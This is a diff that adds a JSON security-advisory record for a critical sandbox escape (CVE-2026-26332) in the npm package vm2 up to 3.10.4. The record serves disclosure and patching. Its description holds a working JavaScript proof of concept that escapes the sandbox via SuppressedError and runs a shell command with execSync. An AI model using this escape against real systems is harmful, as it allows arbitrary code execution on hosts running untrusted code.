@@ -1,0 +1,71 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2026-05-05T16:33:48Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "vm2"
+  },
+  "Advisory": {
+    "DatabaseId": 352983,
+    "Id": "GSA_kwCzR0hTQS01NWh4LWM5MjYtZnI5Nc4ABWLX",
+    "GhsaId": "GHSA-55hx-c926-fr95",
+    "References": [
+      {
+        "Url": "https://github.com/patriksimek/vm2/security/advisories/GHSA-55hx-c926-fr95"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-26332"
+      },
+      {
+        "Url": "https://github.com/patriksimek/vm2/commit/119fd0aa1e4c27b08cf37946b2dafa99e2c754f0"
+      },
+      {
+        "Url": "https://github.com/patriksimek/vm2/commit/4cb82cc94d9bb6c9a918b45f8c6790c32a5e913f"
+      },
+      {
+        "Url": "https://github.com/patriksimek/vm2/commit/7395c3a4b01d302e55271c87dbeb44d6b83b81ca"
+      },
+      {
+        "Url": "https://github.com/patriksimek/vm2/commit/792e16d56ee429ab19e284ed9c545f5e4694fb7d"
+      },
+      {
+        "Url": "https://github.com/patriksimek/vm2/commit/d715dd88c5aec5bbb4dce03ddf7c3eb3791d0338"
+      },
+      {
+        "Url": "https://github.com/patriksimek/vm2/releases/tag/v3.11.0"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-55hx-c926-fr95"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-55hx-c926-fr95"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-26332"
+      }
+    ],
+    "Description": "In vm2 v3.10.4 on Node.js v24.13.0, `SuppressedError` allows attackers to escape the sandbox and run arbitrary code.\n\n### PoC\n```js\nconst { VM } = require(\"vm2\");\n\nconst vm = new VM();\n\nvm.run(`\nconst ds = new DisposableStack();\nds.defer(() =\u003e { throw null; });\nds.defer(() =\u003e {\n  const e = Error();\n  e.name = Symbol();\n  e.stack;\n});\ntry {\n  ds.dispose();\n} catch(e) {\n  const Function = e.suppressed.constructor.constructor;\n  const process = new Function(\"return process;\")();\n  const { execSync } = process.mainModule.require(\"node:child_process\");\n  execSync(\"echo pwned\", { stdio: \"inherit\" });\n}\n`);\n```",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-05-05T16:33:45Z",
+    "Severity": "CRITICAL",
+    "Summary": "VM2 Has a Sandbox Escape Issue via SuppressedError",
+    "UpdatedAt": "2026-05-05T16:33:48Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 9.8,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "3.11.0"
+      },
+      "VulnerableVersionRange": "\u003c= 3.10.4"
+    }
+  ]
+}
